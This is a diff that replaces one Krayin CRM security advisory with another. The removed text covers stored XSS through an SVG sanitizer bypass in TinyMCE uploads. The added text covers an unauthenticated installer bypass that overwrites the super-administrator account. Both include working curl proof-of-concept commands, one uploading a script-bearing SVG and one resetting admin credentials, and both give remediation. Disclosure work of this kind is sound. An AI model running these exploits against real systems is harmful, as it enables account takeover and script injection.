@@ -1,482 +1,188 @@
-\# Stored XSS via SVG Sanitizer Bypass in TinyMCE Media Upload (Krayin CRM ≤ 2.2.5)
+# Security Advisory — Unauthenticated Installer Bypass Leading to Super Administrator Account Takeover
 
+## Overview
 
+**Title:** Unauthenticated Installer Bypass Leading to Super Administrator Account Takeover  
+**Product:** Krayin CRM  
+**Affected Version:** 2.2.4  
+**Vulnerability Type:** Authentication Bypass / Improper Access Control / Installer Exposure After Installation  
+**CWE-306:** Missing Authentication for Critical Function  
+**CWE-284:** Improper Access Control  
+**CWE-863:** Incorrect Authorization  
+**CVE:** Pending
 
-\## CVE Description
+---
 
+# CVE Description
 
+Krayin CRM 2.2.4 contains an authentication bypass vulnerability in the installer component. After the application has been installed, the installer remains accessible through its AJAX API endpoints. An unauthenticated remote attacker can bypass the installation protection by sending the `X-Requested-With: XMLHttpRequest` header and invoke installer endpoints without authentication. The exposed `POST /install/api/admin-config-setup` endpoint updates the existing super administrator account, allowing an attacker to replace the administrator's username, email address, and password, resulting in complete administrative account takeover.
 
-A stored cross-site scripting (XSS) vulnerability in the TinyMCE media upload functionality of Krayin CRM through 2.2.5 allows an authenticated user with TinyMCE upload permissions to bypass SVG sanitization and upload a malicious SVG file containing JavaScript. The vulnerability occurs because SVG detection relies on the client-controlled filename extension instead of the actual file content, allowing an attacker to upload SVG content using a non-SVG filename. The uploaded file is stored as an SVG on the public storage disk and served as `image/svg+xml`, resulting in JavaScript execution in the application origin.
+---
 
+# Severity
 
+**CVSS v3.1 Base Score:** 9.8 (Critical)
 
-\## Summary
-
-
-
-Krayin implements SVG sanitization for TinyMCE uploads through the `Sanitizer` trait. However, the decision to apply sanitization is based on the client-supplied filename extension rather than trusted file content.
-
-
-
-An attacker can upload an SVG payload named with a non-SVG extension, such as `evil.png`. The `isSvgFile()` validation returns false because it checks the user-controlled extension, causing the sanitizer to be skipped. The upload process later determines the file extension from the actual content and stores the file as an `.svg` file.
-
-
-
-The resulting file is stored under the public storage directory:
-
-
-
-```
-
-/storage/tinymce/<hash>.svg
+**Vector:**
 
 ```
-
-
-
-and served with:
-
-
-
+CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
 ```
 
-Content-Type: image/svg+xml
+---
+
+# Affected Component
+
+- Installer Middleware (`CanInstall`)
+- Installer API
+- Administrative Configuration Endpoint
+
+Affected endpoint:
 
 ```
-
-
-
-Opening the URL executes the embedded JavaScript in the CRM origin.
-
-
-
-This vulnerability represents a bypass of the SVG sanitizer protection and remains present in the TinyMCE upload path, independent from other upload-related fixes introduced in version 2.2.5.
-
-
-
-\## Severity
-
-
-
-\*\*High\*\*
-
-
-
-\*\*CVSS v3.1:\*\* `AV:N/AC:L/PR:L/UI:R/S:C/C:H/I:H/A:N` (\*\*8.7\*\*)
-
-
-
-Stored XSS reachable by authenticated users with TinyMCE upload access. The stored payload is additionally accessible without authentication through the public `/storage` path.
-
-
-
-\## Affected Versions
-
-
-
-Confirmed on:
-
-
-
-\- Krayin CRM 2.2.4
-
-\- Krayin CRM 2.2.5
-
-
-
-The vulnerable `TinyMCEController` implementation and `Sanitizer` trait behavior are identical across both versions.
-
-
-
-\## Affected Component
-
-
-
-\*\*Controller\*\*
-
-
-
+POST /install/api/admin-config-setup
 ```
 
-Webkul\\Admin\\Http\\Controllers\\TinyMCEController
+---
+
+# Technical Details
+
+The installer is intended to become inaccessible once the application has been successfully installed.
+
+The protection implemented by the `CanInstall` middleware only blocks standard HTTP requests after installation. However, the middleware explicitly allows AJAX requests identified by the `X-Requested-With: XMLHttpRequest` header.
+
+As a result:
+
+- Visiting `/install` normally redirects the user away from the installer.
+- Sending the same request as an AJAX request bypasses the middleware.
+- All installer API endpoints remain reachable without authentication.
+
+One of these endpoints is:
 
 ```
-
-
-
-Methods:
-
-
-
+POST /install/api/admin-config-setup
 ```
 
-upload()
+This endpoint performs an `updateOrInsert()` operation on the administrator record (User ID 1), replacing the existing administrator information with attacker-controlled values.
 
-storeMedia()
+An unauthenticated attacker can therefore overwrite:
 
-```
+- Administrator name
+- Administrator email
+- Administrator password
 
+The attacker can immediately authenticate using the newly created credentials and obtain full administrative access to the application.
 
+Additional installer API endpoints also remain exposed after installation and may allow further modification of application settings or installation-related operations.
 
-\*\*Trait\*\*
+---
 
+# Impact
 
+A remote unauthenticated attacker can:
 
-```
+- Bypass installer restrictions.
+- Access installer functionality after deployment.
+- Replace the existing super administrator credentials.
+- Take over the administrator account.
+- Gain complete administrative privileges.
+- Modify application configuration.
+- Fully compromise the CRM instance.
 
-Webkul\\Core\\Traits\\Sanitizer
+Successful exploitation results in complete loss of confidentiality, integrity, and availability.
 
-```
+---
 
+# Root Cause
 
+The installer protection depends on whether the request is identified as an AJAX request rather than verifying that the installer has been permanently disabled after installation.
 
-Methods:
+Security-sensitive installer functionality remains reachable after deployment, exposing privileged administrative operations without authentication.
 
+---
 
+# Proof of Concept (PoC)
 
-```
-
-isSvgFile()
-
-sanitizeSvg()
-
-```
-
-
-
-\*\*Endpoint\*\*
-
-
-
-```
-
-POST /admin/tinymce/upload
-
-```
-
-
-
-\---
-
-
-
-\## Technical Description
-
-
-
-The upload routine stores the file using the server-detected extension:
-
-
-
-```php
-
-$extension = $file->extension();
-
-
-
-$filename = md5($file->getClientOriginalName().time()).'.'.$extension;
-
-
-
-$path = $file->storeAs(
-
-&#x20;   $this->storagePath,
-
-&#x20;   $filename
-
-);
-
-```
-
-
-
-However, SVG detection relies on the client-controlled filename:
-
-
-
-```php
-
-public function isSvgFile(UploadedFile $file): bool
-
-{
-
-&#x20;   return str\_contains(
-
-&#x20;       strtolower($file->getClientOriginalExtension()),
-
-&#x20;       'svg'
-
-&#x20;   );
-
-}
-
-```
-
-
-
-An attacker can upload SVG content using a filename such as:
-
-
-
-```
-
-evil.png
-
-```
-
-
-
-The sanitizer check evaluates:
-
-
-
-```
-
-client extension = png
-
-```
-
-
-
-and skips sanitization.
-
-
-
-The application later detects the real content type:
-
-
-
-```
-
-extension = svg
-
-```
-
-
-
-and stores:
-
-
-
-```
-
-<md5>.svg
-
-```
-
-
-
-The malicious SVG is then served as:
-
-
-
-```
-
-Content-Type: image/svg+xml
-
-```
-
-
-
-allowing embedded JavaScript execution.
-
-
-
-\---
-
-
-
-\## Proof of Concept
-
-
-
-Authenticate as a user with TinyMCE upload access:
-
-
+Replace the administrator account without authentication:
 
 ```bash
-
-BASE=https://TARGET
-
-CJ=$(mktemp)
-
-
-
-LT=$(curl -s -c "$CJ" "$BASE/admin/login" \\
-
-&#x20;| grep -oE 'name="\_token" value="\[^"]+"' \\
-
-&#x20;| sed -E 's/.\*value="(\[^"]+)".\*/\\1/')
-
-
-
-curl -s -b "$CJ" -c "$CJ" \\
-
-&#x20; -o /dev/null \\
-
-&#x20; -X POST "$BASE/admin/login" \\
-
-&#x20; --data-urlencode "\_token=$LT" \\
-
-&#x20; --data-urlencode "email=admin@example.com" \\
-
-&#x20; --data-urlencode "password=admin123"
-
-
-
-XSRF=$(python3 -c "import urllib.parse,re;print(urllib.parse.unquote(re.search(r'XSRF-TOKEN\\s+(\\S+)',open('$CJ').read()).group(1)))")
-
-
-
-printf '%s' '<svg xmlns="http://www.w3.org/2000/svg"><script>alert(document.domain)</script></svg>' > evil.png
-
-
-
-curl -s -b "$CJ" \\
-
-&#x20; -X POST "$BASE/admin/tinymce/upload" \\
-
-&#x20; -H "X-XSRF-TOKEN: $XSRF" \\
-
-&#x20; -H "Accept: application/json" \\
-
-&#x20; -F "file=@evil.png;type=image/svg+xml"
-
+curl -i -X POST "http://TARGET/install/api/admin-config-setup" \
+  -H "X-Requested-With: XMLHttpRequest" \
+  --data-urlencode "admin=PwnedAdmin" \
+  --data-urlencode "email=attacker@evil.com" \
+  --data-urlencode "password=Pwned12345"
 ```
 
+Example:
 
-
-\### Observed Result
-
-
-
-The server returns a location similar to:
-
-
-
+```bash
+curl -i -X POST "http://172.25.44.135:8084/install/api/admin-config-setup" \
+  -H "X-Requested-With: XMLHttpRequest" \
+  --data-urlencode "admin=PwnedAdmin" \
+  --data-urlencode "email=attacker@evil.com" \
+  --data-urlencode "password=Pwned12345"
 ```
 
-/storage/tinymce/<hash>.svg
+After execution:
 
+- The administrator account is updated.
+- The attacker can authenticate using the supplied credentials.
+- Full administrative access is obtained.
+
+---
+
+# Remediation
+
+The installer should never remain accessible after installation.
+
+Recommended fixes include:
+
+- Permanently disable all installer routes after installation.
+- Remove installer API endpoints from the routing table once setup has completed.
+- Require authentication and proper authorization for any maintenance functionality.
+- Eliminate any security decisions based on the `X-Requested-With` header.
+- Ensure installer endpoints cannot be reached regardless of request type.
+
+---
+
+# Security Impact
+
+- Authentication Bypass
+- Administrative Account Takeover
+- Full Application Compromise
+- Privilege Escalation
+- Unauthorized Configuration Modification
+
+---
+
+# CWE Classification
+
+- **CWE-306** — Missing Authentication for Critical Function
+- **CWE-284** — Improper Access Control
+- **CWE-863** — Incorrect Authorization
+
+---
+
+# CVSS v3.1
+
+| Metric | Value |
+|--------|-------|
+| Attack Vector | Network |
+| Attack Complexity | Low |
+| Privileges Required | None |
+| User Interaction | None |
+| Scope | Unchanged |
+| Confidentiality | High |
+| Integrity | High |
+| Availability | High |
+
+**Base Score:** **9.8 (Critical)**
+
+---
+
+# Timeline
+
+- Vulnerability discovered during security assessment.
+- Vendor notified through responsible disclosure.
+- CVE Identifier: Pending.
 ```
-
-
-
-Accessing the URL returns:
-
-
-
-```
-
-HTTP/200 OK
-
-Content-Type: image/svg+xml
-
-```
-
-
-
-The SVG content remains unsanitized and the embedded JavaScript executes in the CRM origin.
-
-
-
-The `/storage` URL does not require authentication.
-
-
-
-\---
-
-
-
-\## Impact
-
-
-
-Successful exploitation allows an authenticated attacker with TinyMCE upload permissions to execute arbitrary JavaScript in the CRM application context.
-
-
-
-Potential impacts include:
-
-
-
-\- Session theft;
-
-\- CSRF token exposure;
-
-\- Performing actions as another user;
-
-\- Administrative account compromise when accessed by privileged users;
-
-\- Persistent malicious content hosted on the application domain.
-
-
-
-\---
-
-
-
-\## Suggested Remediation
-
-
-
-\- Detect SVG files using trusted server-side content inspection instead of client-controlled filenames.
-
-\- Always apply SVG sanitization based on actual file content.
-
-\- Reject uploads when sanitization fails.
-
-\- Avoid storing active content such as SVG files on publicly accessible storage.
-
-\- Serve uploaded files using restrictive headers such as `Content-Disposition` and an appropriate Content Security Policy (CSP).
-
-
-
-\---
-
-
-
-\## Weakness Classification
-
-
-
-\- \*\*Primary:\*\* CWE-79 — Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')
-
-\- \*\*Root Cause:\*\* CWE-646 — Reliance on File Name or Extension of Externally-Supplied File
-
-\- \*\*Contributing:\*\* CWE-434 — Unrestricted Upload of File with Dangerous Type
-
-\- \*\*Additional:\*\* CWE-693 — Protection Mechanism Failure
-
-
-
-\*\*VulDB Classification\*\*
-
-
-
-```
-
-Cross Site Scripting
-
-```
-
-
-
-\---
-
-
-
-\## Disclosure
-
-
-
-Reported privately under coordinated vulnerability disclosure.
-
-
-
-Proof-of-concept, reproduction steps, and affected version evidence are available upon request.
-
-
-
-Please credit the reporter and request a CVE identifier if applicable.
-
